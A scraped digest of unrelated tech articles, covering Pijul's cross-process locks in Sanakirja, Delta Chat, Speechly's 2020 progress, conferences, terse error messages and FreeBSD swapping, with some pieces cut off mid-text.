In this post, I explain how it works.</p><h2 id="the-problem">The problem</h2><p>Sanakirja is essentially a <a href="https://en.wikipedia.org/wiki/Copy-on-write">copy-on-write</a> collection of <a href="https://en.wikipedia.org/wiki/B-tree">B trees</a> in a file. We can start <em>mutable</em> transactions, which allow us to change the database, and can be dropped (after which the database remains unmodified) or committed, and <em>immutable</em> transactions, which only allow us to read the database.</p><p>There are a few rules to prevent race conditions: there can only be one mutable transaction started at a time, and mutable transactions cannot start if an immutable transaction started before the last commit is still active.
In other words, the following scenarios are allowed: in these drawings, the green mutable transaction starts first, and the blue transaction starts after the commit of the green one. The pink immutable transaction starts before everything else. The pink transaction can continue even after the commit of the green transaction, and will read the database as it was before the green transaction started.</p><p>However, before starting the blue transaction, we must wait for the end of the pink one.</p><p><img src="https://pijul.org/img/concurrence0.svg"></p><p>As shown in the following drawing, it does not matter whether the pink transaction was started before or after the beginning of the green one:</p><p><img src="https://pijul.org/img/concurrence1.svg"></p><p>Another notable feature of this system is that another immutable transaction (drawn in orange in the below diagram) can even be started between the two mutable transactions, in parallel to the pink transaction. In that case, the orange and pink transactions will read <em>different versions</em> of the database.
This is allowed because the orange transaction starts <em>after</em> the commit of the green one.</p><p><img src="https://pijul.org/img/concurrence2.svg"></p><h2 id="implementation-of-the-trees">Implementation of the trees</h2><p>The size of nodes in the B tree is 4096 bytes, which is the size of memory pages on most platforms (<a href="https://www.oracle.com/technetwork/server-storage/sun-sparc-enterprise/documentation/sparc-arch-2007-2516668.pdf">UltraSPARC</a> being an exception, with 8192 bytes pages).</p><p><a href="https://pirl.nvsl.io/PIRL2019-content/PIRL-2019-Andy-Rudoff.pdf">Pages are often considered to synchronise to disk <em>atomically</em></a><sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, even though larger chunks might only be partially synchronised. This is why it is always safe to choose a smaller block size than the page size of the platform: the larger pages on UltraSPARC will be slower to synchronise, but that synchronisation will still happen atomically, thanks to disk caches.</p><p>In Sanakirja, the first page contains pointers to (1) the list of free pages and (2) a collections of at most 500 different pointers to B trees.</p><p>In a mutable transaction, existing pages are not modified: they are instead <em>copied</em> to a newly allocated page. This sounds horrible in terms of performance, but it is not that bad in practice, since we have to copy these pages to memory anyway before we can access them in the program, and write them back to disk after modifying them, and these synchronous input/output operations are much more expensive than copying page-size blocks, even on SSDs.</p><h2 id="cross-process-locks">Cross process locks</h2><p><a href="https://pijul.org/posts/2019-03-20-sanakirja-0.10/#the-concurrency-model">I wrote before about the lock model of Sanakirja</a>, but this was limited to the scope of a single process, and was relying on file locks to work, in the sense that any process using Sanakirja would first have to take an exclusive file lock, and then use the correct concurrency model between threads inside a process.</p><p>However, Pijul sometimes needs a bit more than this: for example, <a href="https://nest.pijul.com/cole-h">@cole-h</a> reported in issue <a href="https://nest.pijul.com/pijul/pijul/discussions/43">#43</a> that <code>pijul record</code> locked up other commands, which was inconvenient if you wanted to open a log while editing a change.</p><p>It is of course fundamental to prevent two records, or a record and a pull, to happen in parallel, but a full exclusive lock was clearly too much.</p><p>The system needs three atomic variables in order to work:</p><ul><li>A global clock, incremented at each commit.</li><li>A counter of active immutable transactions.</li><li>A counter of transactions active during the last commit. This is useful to make the difference between the pink and orange transactions in the drawings above.</li></ul><p>Each immutable transaction remembers the value of the clock at the time it starts, and increments the active transaction counter. When it stops, it decrements the counter of active immutable transactions, and if it started before the last commit, also decrements the counter of transactions active during the last commit.</p><p>I considered two different systems to implement this in a cross-process way:</p><ol><li><p>Reading and updating all these values at once to a file at each operation (maybe using shared memory), where the file would be protected by a lock (or a named mutex or semaphore). This sounds feasible in principle, but there is a catch: at the end of the last immutable transaction that was started before the last commit, we need a mechanism to signal to a potential mutable transaction that it can start. Between threads, this is achieved with condition variables. Between processes, this is more complicated: we could use Unix signals, but their handlers can interrupt any running function, which means that these handlers cannot take any mutex, and cannot talk to Tokio at all, which limits their usefulness.</p></li><li><p>The other option, which I ended up implementing, is to write a barebones implementation of the locking model in an external process, using Tokio tasks to model transactions, and communicate with that Tokio runtime with Unix Domain Sockets. Every time a transaction starts, it tries to connect to a Unix Domain Socket at a specified location. If that fails, a new process is forked, to run the <code>pijul lock</code> hidden command in the background (using <a href="https://doc.rust-lang.org/std/process/struct.Command.html#method.spawn">std::process::Command::spawn</a>), which opens a Unix Domain Socket and prints a new line to its standard output. The parent process waits for that newline, and then connects to the socket. The <code>pijul lock</code> command then works as follows:</p></li></ol><ul><li>The protocol implemented over the UDS has three commands (start an immutable transaction, start a mutable transaction, and commit), and two answers (called <code>ack</code> and <code>locked</code>). All these messages are encoded on one byte.</li><li>The caller use Tokio IO to wait for a response.</li><li>When the last client disconnects from the socket, <code>pijul lock</code> waits for one second, checks whether there are other clients, and then exits if there are none. This delay avoids starting instances of <code>pijul lock</code> over and over again when using pijul in a script.</li></ul><p>The source code for that new command can be seen <a href="https://nest.pijul.com/pijul/pijul:main/JL4WKA5PBKXRM.BQOAA">here on the Nest</a>, and the source code for the two kinds of transactions is available <a href="https://nest.pijul.com/pijul/pijul:main/JL4WKA5PBKXRM.UQDQA">here, also on the Nest</a>.</p><h2 id="conclusion">Conclusion</h2><p>First, this only works on Unix platforms at the moment, but it seems the equivalent of UDS on Windows <a href="https://github.com/tokio-rs/tokio/issues/2201">might be implemented soon in Tokio</a>. Pijul on Windows still relies on standard file locks.</p><p>Moreover, this is implemented in Pijul at the moment, not in Libpijul, because Libpijul is not meant to depend on Tokio in the long run (that dependency will be dropped before the beta of 1.0).</p><p>A finaly thing to note is that file locks are advisory, and so is this external process. This means that they are safe to use as long as all processes that write to the database are aware of them. However, as is the case for all files in a filesystem, a process that refuses to cooperate, and has write access to a file, will always be able to corrupt it.</p><h2 id="discussions">Discussions</h2><ul><li><a href="https://www.reddit.com/r/rust/comments/kxt19w/crossprocess_locks_between_transactions_in/">On Reddit</a></li><li><a href="https://pijul.zulipchat.com/">On Zulip</a></li></ul><section role="doc-endnotes"><hr><ol><li id="fn:1" role="doc-endnote"><p>Thanks to HackerNews user @vlowther for pointing out an oversimplification in an earlier version of this post. Sanakirja relies on the atomicity of $24 + 8r$ bytes, where $r$ is the number of “root” tables. In most cases, this is way less than 4Kb. When loads of tables are needed, Sanakirja can represent “tables of tables, indexed for example by an integer” (this has the Rust type <code>Db&lt;u64, Db&lt;K, V&gt;&gt;</code>), using a single root table, in which case the atomicity requirement falls down to 32 bytes. <a href="#fnref:1" role="doc-backlink">↩︎</a></p></li></ol></section></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><data value="https://jlelse.blog/posts/email-messenger-delta-chat"></data><div><p>Published on <time datetime="2021-01-14T17:23:36+01:00">January 14, 2021</time> in <a href="https://jlelse.blog/posts">✍️ Posts</a></p></div><div><p>Today I have heard again a discussion about WhatsApp, Telegram, Signal and Threema and there was the question to which messenger one would switch from WhatsApp.</p><p>While I find Telegram very pleasant as an everyday messenger, since it offers me the best user experience and also has some features (bots, channels) that other messengers don’t have, <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Delta Chat came to mind again</a>.</p><p>Everyone has an email address, email is decentralized and Delta Chat encrypts messages automatically.</p><blockquote><p>What I really like about this is, that using the existing email infrastructure enables everyone to communicate with each other without the restriction to use the same messenger or client. Anyone can choose any client and can still be connected. Just login with your usual email account. You don’t even need to use one of those messaging optimized clients and stay with your regular email client.</p><p>– <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Jan-Lukas Else (2019)</a></p></blockquote><p>I installed <a href="https://delta.chat/" target="_blank" rel="noopener">Delta Chat</a> on my smartphone again today. While the app wasn’t quite mature 2 years ago, I have to say it’s pretty decent now. The Android app seems to be based on the Signal interface. But Delta Chat is also available for desktops (Windows, macOS and Linux) and iOS. And the best part - something Signal, Threema and WhatsApp have problems with - Delta Chat can be used from multiple devices without any problems.</p><p>But the most important thing: Delta Chat allows you to communicate even with people who don’t use Delta Chat at all, all you need is an email address! If you write to someone without Delta Chat, they will just get a normal email. I would argue that even beats Matrix or XMPP.</p><p>Conclusion: If you are concerned about security when chatting and would rather use a decentralized messenger (no silo), you are in good hands with email and Delta Chat.</p><p>However, it would be advisable not to use Gmail, Outlook or GMX as email service, but a reasonable email service. I use <a href="https://www.servercow.de/mailcow?lang=en" target="_blank" rel="noopener">mailcow</a> for example, where just today there was <a href="https://mailcow.email/2021/01/14/back-to-the-future-with-delta-chat/" target="_blank" rel="noopener">an announcement about Delta Chat</a>.</p></div><p><b>Tags</b>:

January 15, 2021 | https://www.speechly.com/blog/speechly-in-2020/ | <a href="https://web.archive.org/web/*/https://www.speechly.com/blog/speechly-in-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Speechly has existed now for about for five years. We are a team of 13 experienced software developers and machine learning experts and for the most part of that five years, we’ve been operating in stealth mode, focusing on building our core technologies. Now it’s time to tell what we’ve achieved so far. We are building a <a href="https://www.speechly.com/develop/">developer tool</a> for improving touch screen user experience by voice functionalities. We don’t believe that smart speakers and voice assistants are the best use case for voice, but voice should be thought of as an add-on to current mobile applications’ and websites’ user interface. Voice is a modality, not a complete user interface.</p><p>Touch screen user interfaces definitely need improvements: while selecting from a few options is easy, selecting for example 30 items from an inventory of 20.000 is pretty cumbersome.</p><p>Typing is notoriously hard, too. Most humans speak about three times faster with less errors than they type. In short, voice is a great solution for information heavy tasks. While there are good solutions for speech recognition, there’s really no tools that would enable developers build the kind of user interfaces we’ve envisioned for voice.</p><p>2020 was our first year when we really published something out in the wild. We’ve built our technology for the past five years and now Speechly is finally in a stage that a developer can configure a model, integrate it to their application and build an awesome voice user interface. In this post, I’ll summarize our achievements.</p><h2>1 Spoken Language Understanding accuracy matching Google</h2><p>We run our own ASR and NLU technologies that provide both transcript and meaning (intents and entities) in real-time. During the 2020 we achieved significant increases in both ASR and NLU accuracy.</p><p>We evaluate the accuracy of our engine by transcribing the data we receive with both our own and with <a href="https://cloud.google.com/speech-to-text">Google Cloud Speech API</a>. Based on our results, our Spoken Language Understanding is in a typical voice user interface task <strong>15% more accurate</strong> than Google.</p><p>Because ASR is a hard task, this is not to claim that our technology is better than Google in all cases. It means that when building voice user interfaces, Speechly outperforms Google in most cases, even without training the model separately for a certain use case.</p><p>In a real case, Speechly can further be optimized by using the actual user data for retraining the model. This improves the accuracy typically by another 10-15%.</p><h2>2 Client libraries for most important web and mobile platforms</h2><p>During the 2020, we’ve published three client libraries that make integrating Speechly to an application simple and fast. Handling GRPC API, real-time audio streaming and of course parsing the results is a cumbersome task and the client libraries take most of the workload off our developers.</p><p>Our <a href="https://docs.speechly.com/client-libraries/web-client/">browser-client</a> can be used in all web applications in modern browsers and <a href="https://docs.speechly.com/client-libraries/react/">React client</a> makes development on React framework even easier.</p><p>For the iOS, we released the <a href="https://docs.speechly.com/client-libraries/ios/">iOS client</a> and our <a href="https://docs.speechly.com/client-libraries/android/">Android client</a> will be published very soon. After that, developers can easily build a unified voice user interface on all major platforms.</p><p>We have created a simple tutorial application for all of the client libraries for a gradual learning curve on all platforms.</p><h2>3 Demos showcasing our technology</h2><p>Speechly is a tool for building real-time voice functionalities that <a href="https://www.speechly.com/blog/voice-application-design-guide/">integrate seamlessly</a> to existing touch or web user interfaces.</p><p>We <a href="https://www.speechly.com/blog/real-time-voice-user-interfaces/">don’t think</a> smart speakers or "voice-only” solutions is the best way to use voice and rather advocate multimodality and real-time visual feedback.</p><p>Some of the demos we built in 2020 include a <a href="https://fashion.speechly.com/">fashion eCommerce voice search filtering</a> app and a classic <a href="https://home-automation-app-demo.herokuapp.com/">home automation</a> app. Try them out!</p><h2>4 Speechly Annotation Language features for configuring voice user interfaces</h2><p>Our Speechly Annotation Language (SAL) is a syntax we use to annotate example utterances that are used to train our models. In 2020 we added many new features to SAL:</p><ul><li>Alphanumeric sequences</li><li>Dates</li><li>Permutations</li><li>Multi-intent utterances</li><li>Variables</li><li>Canonical entities for easy handling of synonyms</li><li>Lookup tables for handling large inventories</li></ul><p>With these features, developers and designers can create complex voice user interfaces with a minimal amount of example utterances. Because the same model can be used on all platforms, the user experience is unified.</p><h2>5 Improved latency in our GRPC API</h2><p>When iPhone nailed the user experience with the touch screen, one of the key features was the very responsive user interface that reacted immediately to user input. This is a key issue also for voice user interfaces.</p><p>We’ve improved our latency in 2020 significantly and now we can proudly say that our API is real-time with tail latency of under 200 milliseconds.</p><p>Low latency is the key to intuitive user experience in two ways: first, it enables user to correct themselves naturally by using voice and second, it encourages the user to go on with the voice experience.</p><p>Compare this to the traditional smart speaker user experience that first starts by uttering a wake word that sometimes fails. Once the wake word is recognized and user starts speaking, they’ll know whether they were understood only after they have stopped speaking and the system has processed the input. If the answer is wrong, the user needs to start again from the beginning.</p><h2>6 Speechly Dashboard</h2><p>In March we published the first version of the Speechly Dashboard, a web application for building and configuring Spoken Language Understanding models with the Speechly Annotation Language.</p><p>The Dashboard supports nearly all Speechly features and it’s the fastest way for getting up to speed with our technology. Hundreds of developers have already created their models and tried them out in the Speechly Playground.</p><h2>7 Other achievements</h2><p>We’ve also published our <a href="https://docs.speechly.com/">developer documentation</a>, many <a href="https://www.youtube.com/channel/UCvEar86D8CnD3zDJSydOdbA">videos on using our technology</a> and <a href="https://www.speechly.com/blog/configure-voice-ui-command-line/">command line tools</a> for integrating Speechly to multi-user development workflows.</p><p>We renewed our website to better position our product and hired many new developers and machine learning experts. Our founders have been interviewed in many industry leading podcasts and we were nominated as one of the Europe’s Hottest Startups.</p><p>If you want to work with us and build awesome developer tools for next-generation voice user interfaces, please check our <a href="https://www.speechly.com/careers/">careers page</a>.</p><h2>What next?</h2><p>Overall, we are pretty happy with our 2020. We’ve now built a technology stack that enables efficient user interfaces that improve user experience significantly. In 2021 we focus on showing the world some cool examples of our technology.</p><p>If you are interested in staying in the loop, please subscribe to our newsletter below.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>Here is my current take on tech conferences. In my opinion, the benefits of attending tech conferences revolve around three main things:</p><ol><li>Learning.</li><li>Inspiration.</li><li>Networking.</li></ol><p>After attending many conferences in the last couple of years, I realised that if you are not into networking and getting to know people in the conference days, then the main benefit of attending is gone. If you would like to learn and get inspired, just watch the talks online. I understand that attending the talk may give you a chance to ask the speaker a question. But this can be done also on Twitter, I believe most speakers are on Twitter and they are happy to answer the questions you have.</p><p>I also believe that inspiration can be achieved by watching the talks, <a href="https://twitter.com/dhh">DHH</a> and <a href="https://twitter.com/garyvee">GaryVee</a> inspired me for years by only watching their conference talks but I've never met them in person. It worked for me, I also understand if you met them and talked to them in a conference you may be getting more inspired but not all conferences have the people who inspire you anyway. And to be honest with myself, I would go to a conference just because of some specific speaker are there, but most conferences do not have such speakers all the time.</p><p>For networking, this is the main benefit of conferences, you go out there you try to promote your work, find business partners, making deals, make connections with people and companies. So if you want to do networking, conferences are the best place to do so.</p><p>Probably, with almost all conferences last year (2020) happened online, this idea of getting the learning and inspiration part became more convincible. You can even argue that networking can be easily done online via social media or online conferences. But I think meeting in person still has its benefits and many people will still go to conferences just because it is fun and to meet new people and visiting new cities. This alone justifies going.</p>

<p>Let's compare some error messages -- specifically, the ones that occur when
you try to execute a nonexistant command in Windows PowerShell and GNU
Bash.</p>
<p>PowerShell:</p>
<pre><code>PS C:\&gt; lorem --ipsum dolor -sit amet
lorem : The term 'lorem' is not recognized as the name of a cmdlet, function, script file, or operable program.
Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ lorem --ipsum dolor -sit amet
+ ~~~~~
+ CategoryInfo          : ObjectNotFound: (lorem:String) [], CommandNotFoundException
+ FullyQualifiedErrorId : CommandNotFoundException

PS C:\&gt; exit
</code></pre>
<p>and GNU Bash:</p>
<pre><code>$ lorem --ipsum dolor -sit amet
bash: lorem: command not found
$ 
</code></pre>
<p>The first thing you'll notice is that PowerShell's output is far, <em>far</em>
more verbose. You've got an error, a nice helpful message suggesting that
you "check the spelling of the name and try again", and a stack trace.
Meanwhile, <code>bash</code> just tells you <code>command not found</code>.</p>
<p>So: which error message is better?</p>
<p>Eric Raymond, in his excellent book <em>The Art of UNIX Programming</em>, explains
that a good UNIX program should output the least amount of stuff that it
can, a rule he calls the "Rule of Silence":</p>
<blockquote>
<p>One of Unix's oldest and most persistent design rules is that when a
program has nothing interesting or surprising to say, it should <em>shut
up</em>. Well-behaved Unix programs do their jobs unobtrusively, with a
minimum of fuss and bother. Silence is golden.</p>
<p>This "silence is golden" rule eveolved originally because Unix predates
video displays. On the slow printing terminals of 1969, each line of
unnecessary output was a serious drain on the user's time. That
constraint is gone, but excellent reasons for terseness remain. (Raymond,
43)</p>
</blockquote>
<p>He quotes Ken Arnold:</p>
<blockquote>
<p>...important information should not be mixed in with verbosity about
internal program behaviour. If all displayed information is important,
important information is easy to find.</p>
</blockquote>
<p>Raymond continues:</p>
<blockquote>
<p>Well designed programs treat the user's attention and concentration as a
previous and limited resource, only to be claimed when necessary.
(Raymond, 44)</p>
</blockquote>
<p>It is Arnold's quote that I'd like to expand on. Not only should you not
include unimportant information, but you should also output the important
stuff in the tersest possible form.</p>
<p>Why? Because <strong>users don't like reading.</strong></p>
<p>When a user is using a particular application, they are usually trying to
get something done. They may be trying to check their email, launch an IM
client, or start their browser. Reading stuff takes time, and thus slows
the user down. Because of this, users will do the minimal amount of reading
that they can.</p>
<p>Therefore, a terse error message is more likely to get properly read than a
verbose error.</p>
<p>"But wait! PowerShell's message is more user-friendly, because it reminds
the user to check their spelling!" Pffft. Anyone smart (for lack of a
better word!) enough to use PowerShell will know that they should
double-check their spelling without an error message telling them to do so.</p>
<p>And even in "normal" applications -- where the majority of users are not
knowledgable enough to know that their spelling could be to blame -- an
error message that's too verbose is <em>still</em> problematic, because many, if
not most, non-techy users won't bother reading it!</p>
<p>And if you <em>simply must include</em> a help/hint message -- do so in a way that
won't distract the user from the actual error.</p>
<p>For example, just look at the default Windows error message for an
incorrect password:</p>
<blockquote>
<p>You can't sign into your device right now. Go to account.live.com to fix
the problem, or try the last password you used on this device.</p>
</blockquote>
<p>Now, this could have just been written as</p>
<blockquote>
<p>Login incorrect</p>
</blockquote>
<p>which is the error message that's displayed on Linux when a user attempts
to login from a TTY.</p>
<p>However: a "Windows account" is actually a Microsoft account, and the
password is the same. Which means that if a user changes her Microsoft
account password on another device, and then tries to login on another
device that hasn't connected to the internet yet and received the new
password, she will have to use the last password she used on that
particular device.</p>
<p>Most users, however, probably won't realize this in such
a scenario, so it's OK to say that in the error message. The trick is to
include it in such a way so as to not make the error message seem too long:</p>
<blockquote>
<p><strong>Incorrect password</strong></p>
<hr>
<p><em>Note: try using the last password you used on this device.</em></p>
</blockquote>
<p>Notice how the main error ("Incorrect password") is in bold, and the hint,
two lines below, was in italics. I didn't put the hint in
<small>small</small> text, because that would give the impression to a
naive user that it was some kind of legal/technical message that she
doesn't have to pay attention to.</p>
<h2 id="anti-case-studies">(anti-)case studies</h2>
<h3 id="google">Google</h3>
<p>Take a look at the error message given when your Google search didn't turn
up anything:</p>
<blockquote>
<p>Your search -- <strong>asdf;asdf;asdf;asdf;asdf;asdf;as...</strong> did not match any
documents.</p>
<p>Suggestions:</p>
<ul>
<li>Make sure all words are spelled correctly.</li>
<li>Try different keywords.</li>
<li>Try more general keywords.</li>
<li>Try fewer keywords.</li>
</ul>
</blockquote>
<p>For one thing, repeating the entire search query in bold isn't necessary.
The user already knows what they searched for.</p>
<p>The suggestions, however,
are OK since they are visually separate from the error.</p>
<p>Fixed:</p>
<blockquote>
<p><strong>No results found.</strong></p>
<hr>
<p>Tips:</p>
<ul>
<li>Check your spelling.</li>
<li>Try different keywords.</li>
<li>Try more general keywords.</li>
<li>Try fewer keywords.</li>
</ul>
</blockquote>
<p>Notice how I condensed the main error message and the first suggestion,
and replaced <code>Suggestions:</code> with <code>Tips:</code>.</p>
<h3 id="ssh">SSH</h3>
<pre><code>$ ssh tilde.zone

<p>I see several things wrong:</p>
<ul>
<li>the first line (<code>The authenticity of host can't be established</code>) is too verbose.</li>
<li>the second line (<code>ECDSA key fingerprint is...</code>) is too verbose.</li>
<li>the prompt to continue to way too verbose.</li>
<li>the warning is too verbose.</li>
<li>the <code>permission denied</code> error is just a little bit too verbose.</li>

<p>Fixed:</p>

<p>As you can see, I've condensed the first line, continue prompt, and warning
quite a bit; I've also changed the second line to not be a sentence, thus
eliminating a whole two letter word ;)</p>
<p>The warning has been changed to not repeat the host and ip address, which
was already listed previously. The completely unnecessary <code>please</code>
has been removed from the password error.</p>
<h3 id="su"><code>su</code></h3>
<p>The example with the shortest name also has the shortest error message,
<code>su</code>:</p>
<pre><code>$ su
Password:
su: Authentication failure
</code></pre>
<p>Notice the beautifully terse error message.</p>
<p>(And if you're wondering why <code>su</code> just doesn't say <code>incorrect password</code>,
it's probably due to <code>su</code> being incapable of knowing whether it's really
the password that was wrong, or the username, or something else.)</p>
<h3 id="gnu-cat">GNU <code>cat</code></h3>
<p><code>cat</code>'s error on an incorrect path is terse, but not terse enough:</p>
<pre><code>$ cat invalid
cat: invalid: No such file or directory
$
</code></pre>
<p>Why say "no such file or directory"? <code>cat</code> doesn't even read directories!</p>
<p>Solution:</p>
<pre><code>$ cat invalid
cat: invalid: invalid path
</code></pre>
<p><em>more case studies will be added as I find them.</em></p>
<h2 id="conclusion">conclusion</h2>
<p>Terser is better. Software isn't the place to show off your writing skills.</p>
<p>And if you really must include some kind of hint or suggestion, make it
visually separate from the error message.</p>

<div>
<p>On modern Unix-like systems such as <strong>FreeBSD</strong>, “<em>swapping</em>” refers to the activity of paging out the contents of memory to a disk and then paging it back in on demand. The page-out activity occurs in response to a lack of free memory in the system: the kernel tries to identify pages of memory that probably will not be accessed in the near future, and copies their contents to a disk for safekeeping until they are needed again. When an application attempts to access memory that has been swapped out, it blocks while the kernel fetches that saved memory from the swap disk, and then resumes execution as if nothing had happened.</p>



<p>All of the above might sound perfectly sensible. After all, disks are typically much larger than RAM, so why not use them to cache infrequently accessed pages of memory? Yet, many experienced system administrators treat swapping as an abnormal activity, a sign of something amiss. This is justifiable: until relatively recently, the disks typically used for swapping had access latencies millions of times higher than RAM. </p>



<p>That is, an application waiting for memory to be paged back in from swap would have to wait for tens of milliseconds while a regular RAM access takes tens of nanoseconds. Heavy usage of swapped-out memory would thus ruin the performance of a system, so swap activity is often taken as a sign that the system needs more RAM or that memory usage needs to be tuned. A common “solution” is to disable swapping entirely, forcing the operating system to resort to other means to free up memory when necessary.</p>



<p>In 2021, cheap SSDs have become commonplace and have performance characteristics much better suited to swapping, so it seems worthwhile to revisit how swapping works in FreeBSD, and try to provide some insight into frequently raised issues.</p>



<h5><strong>Swapping: when and how much?</strong></h5>



<p>Computer systems have a fixed amount of RAM. It is up to the operating system to optimize its usage. Ideally, operating systems would be able to peer into the future to see which data is about to be accessed; with this information they could ensure that the data is available in RAM before it is accessed. Being constrained to the real world, however, they use a set of heuristics which try to predict future memory accesses. An effective and commonly used heuristic is to cache recently accessed data in memory since it is likely to be accessed again, in the near future. When no free memory is available and an application accesses uncached data, FreeBSD determines which memory was least recently accessed and evicts its contents to make room for new data. This algorithm is called Least-Recently Used (LRU).</p>



<p>Note that the kernel cannot simply throw away data[1]; if a copy is not available on disk it must first page out the data before releasing the backing memory. Thus, swap activity is closely tied to LRU.</p>



<p>Implementing LRU precisely comes with a lot of undesirable overhead, so FreeBSD implements an approximation of LRU – it tries to find memory that has not been accessed in a long time, and evicts that. As part of this implementation, FreeBSD partitions the system’s memory into a set of queues: the active, inactive and laundry queues[2]. The sizes of each of these queues is shown by <em>top(1):</em></p>



<pre><code>  Mem: 2591M Active, 6576M Inact, 1389M Laundry, 4155M Wired, 1543M Buf, 1130M Free
  Swap: 8192M Total, 1623M Used, 6569M Free, 19% Inuse
</code></pre>



<div data-columns="3" data-layout="50-25-25"><div>




<div><div>
<p>Did you know?</p>

</div></div>




</div></div>



<p>“<em>Wired</em>” pages are not eligible to be paged out and thus do not participate in LRU. Active pages are frequently referenced; typically, they are mapped into one or more process’ address spaces. For example, memory returned by <em>malloc</em>(3) will initially be resident in the active queue. To determine which active pages are no longer being referenced, a kernel process called the “page daemon” periodically examines the recent access history of each page. Unreferenced pages are aged out of the active queue and into the inactive queue.</p>



<p>The inactive queue contains pages that have not been accessed recently. Such pages are good candidates for reuse if the kernel needs to handle a shortage of free memory. The queue helps order pages by recency of access: newly inactive pages are inserted at the tail of the queue, and pages are reclaimed from the head of the queue.</p>



<p>Earlier we noted that a well-behaved operating system must not throw away data when handling a free memory shortage. If some data is in a page of memory and no copy of that data exists in stable storage, then the page is said to be “dirty” and before it can be reused its contents must be paged out to storage. Otherwise, the page is “clean.” For example, if one searches a file using grep(1), that file’s data must be loaded into memory, but because grep(1)merely reads that data, that memory will be clean and can be reused at any point.</p>



<p>The active and inactive queues will contain a mix of clean and dirty pages. When reclaiming memory to alleviate a shortage, the page daemon will free clean pages from the head of the inactive queue. Dirty pages must first be cleaned by paging them out to swap or a file system. This is a lot of work, so the page daemon moves them to the laundry queue for deferred processing. The laundry queue is managed by a dedicated thread, the laundry thread, which is responsible for deciding when and how much to page out. The relationship between these queues is depicted here:</p>

<p><strong>To summarize:</strong></p>



<p>– The page daemon migrates unreferenced pages from the active queue to the inactive queue (1).</p>



<p>– To free up memory, the page daemon scans pages at the head of the inactive queue (2), frees clean pages (6), and moves dirty pages to the tail of the laundry queue (3).</p>



<p>– When the laundry thread decides to clean some dirty pages (4), it hands them to a pager, which writes their contents to stable storage and places the cleaned pages in the inactive queue (6).</p>



<p>– If a page is referenced after it is placed in the inactive or laundry queues, it will lazily be moved back to the active queue.</p>



<p>One possible strategy for the laundry thread is to just do nothing, relying on reclamation of clean pages to satisfy demand for free memory. Indeed, this is effectively what happens when you disable swap altogether. However, pages in the laundry queue are inactive by definition, and unused memory is wasted memory. Another possible strategy is to launder pages as soon as they enter the queue, but this can result in unnecessary I/O.</p>



<p><strong>The policy used by the laundry thread makes use of several signals:</strong></p>



<p>1) The ratio of the lengths of the inactive and laundry queues,</p>



<p>2) the number of clean pages reclaimed since the last set of page-outs, and</p>



<p>3) the size of the inactive queue relative to its target (minimum) size.</p>



<p>The laundry thread uses the first two signals to control “background” laundering, while the third is used to drive “shortfall” laundering.</p>



<p>The idea behind background laundering is to try and ensure that some dirty pages are paged out before a shortage of clean inactive pages occurs. When the system is out of both free pages and clean inactive pages, applications that need free memory are effectively stuck waiting for some page-outs to swap to complete. The laundry thread therefore tries to ensure that the laundry queue does not grow too large: the larger the ratio (1) of queue sizes, the more frequently the laundry thread will perform page-outs of dirty memory. Because it is a waste of I/O bandwidth to page out dirty memory when there is no shortage of free memory, the laundry thread monitors the activity of the page daemon to determine how frequently it should perform page outs.</p>



<h5><strong>Why is my system using so much swap space?</strong></h5>



<p>When a dirty page’s contents have been paged out to swap, the page is marked clean and becomes eligible for reclamation. At this point, the page’s contents exactly match the copy saved to the swap device. (The page could be dirtied again, in which case it was recently accessed and belongs back in the active queue.) Suppose the page is freed, and later an application tries to read the data. A fresh page will be allocated and the data is paged back in from swap, at which point the application can run again and use that data. At this point the page is still clean – only if the data is written to will the page be marked dirty – so the copy in the swap device is still valid and there is no reason to discard it.</p>



<p>More generally, a write-once-read-many access pattern can be common for some types of data. A long-lived process may allocate and write to a region of memory during startup and thereafter only read from that memory, for example. If that memory is paged out, FreeBSD will retain the copy in swap so long as it remains valid. Otherwise, in order to reclaim that memory, it would have to perform another expensive page-out operation.</p>



<p>It is thus common to see moderate swap space usage even when plenty of free memory is available[3]: at some point in the past, demand for free memory triggered page-outs to swap, and the swapped-out data remained valid.</p>



<h5><strong>Why is the kernel killing my processes?</strong></h5>



<p>In some scenarios, shortfall laundering may not be enough to alleviate a shortage of free memory. A process may have a runaway memory leak or the system may be oversubscribed to the point where it becomes completely unresponsive. The laundry thread may be paging out memory as quickly as possible but cannot meet demand, or the swap device may be full. At this point the kernel has little choice but to try and kill processes to reclaim memory and restore stability to the system – the dreaded OOM (out-of-memory) kill.</p>



<p>FreeBSD will trigger OOM kills in a couple of scenarios. First, if the page daemon repeatedly fails to reclaim _any_ pages from the inactive queue, it will eventually trigger OOM kills. If the swap device is full, the laundry thread will be …</p></div></div></div>

They spend less and drink less.&nbsp;</p>  <p>"There are all these sort of psycho-social responses and economic responses to the spread of a deadly germ that are pretty typical of human populations. And so when all of this is over … we will unravel a lot of those things."</p>  <p>That loosening of pandemic shackles was among the factors that gave rise to the first "roaring '20s," and could help to create a similar era in this century, he said.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5865401.1610057151!/fileImage/httpImage/image.JPG_gen/derivatives/original_300/nicholas-christakis.JPG 300w,https://i.cbc.ca/1.5865401.1610057151!/fileImage/httpImage/image.JPG_gen/derivatives/original_460/nicholas-christakis.JPG 460w,https://i.cbc.ca/1.5865401.1610057151!/fileImage/httpImage/image.JPG_gen/derivatives/original_620/nicholas-christakis.JPG 620w,https://i.cbc.ca/1.5865401.1610057151!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/nicholas-christakis.JPG 780w,https://i.cbc.ca/1.5865401.1610057151!/fileImage/httpImage/image.JPG_gen/derivatives/original_1180/nicholas-christakis.JPG 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5865401.1610057151!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/nicholas-christakis.JPG"></p></div><figcaption>Nicholas Christakis, a former hospice doctor and author of Apollo's Arrow: The Profound and Enduring Impact of Coronavirus on the Way We Live, said any 'roaring '20s' that follows the current pandemic will not likely start until 2024 or later. 